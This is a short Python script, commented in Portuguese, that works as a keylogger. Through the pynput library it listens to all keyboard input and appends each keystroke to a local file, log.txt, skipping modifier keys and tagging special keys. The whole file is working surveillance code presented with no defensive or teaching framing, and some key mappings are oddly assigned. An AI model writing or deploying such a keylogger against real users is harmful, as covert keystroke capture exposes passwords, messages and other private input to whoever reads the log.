from pynput import keyboard

# Teclas que serao ignoradas e nao irao registrar no log
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd
}

# Funcao chamada para registrar tecla pressionada
def on_press(key):
    # Caso seja uma tecla de char, irá registrar no log
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char) 
    
    # Caso nao seja uma tecla char, irá ser tratada
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\r")
            elif key == keyboard.Key.tab:
                f.write("\r")
            elif key == keyboard.Key.caps_lock:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else: 
                f.write(f"[{key}]")

# "Ouvinte", mantem o programa rodando monitorando o teclado.
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()